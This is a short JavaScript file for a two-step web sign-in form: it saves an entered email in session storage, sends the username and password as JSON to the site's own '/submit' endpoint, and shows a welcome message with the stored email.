function handleNext(event) {
  const input = sessionStorage.getItem('userInput');
  const pass = document.getElementById("passwordInput").value.trim();
  const messageBox = document.getElementById("messageBox");

  if (!input || !pass) {
    messageBox.textContent = "Enter your password.";
    messageBox.style.display = "block";
    return;
  }
  fetch('/submit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: input, password: pass })
  })
  .then(response => {
    if (!response.ok) throw new Error('Network response was not OK');
    return response.json();
  })
  .catch(error => {
    console.error("Fetch error:", error);
    alert(`Submission failed: ${error.message}`);
  });
}


function handleUser() {
  const input = document.getElementById("userInput").value.trim();
  const messageBox = document.getElementById("messageBox");

  if (!input) {
    messageBox.textContent = "Enter an email.";
    messageBox.style.display = "block";
  } else {
    // Store input in sessionStorage
    sessionStorage.setItem("userInput", input);
  }
}

window.addEventListener('DOMContentLoaded', () => {
  const subtitle = document.getElementById('welcomeSubtitle');
  const username = sessionStorage.getItem('userInput') || 'Guest';
  if (subtitle) {
    subtitle.textContent = `Welcome ${username}`;
  }
});

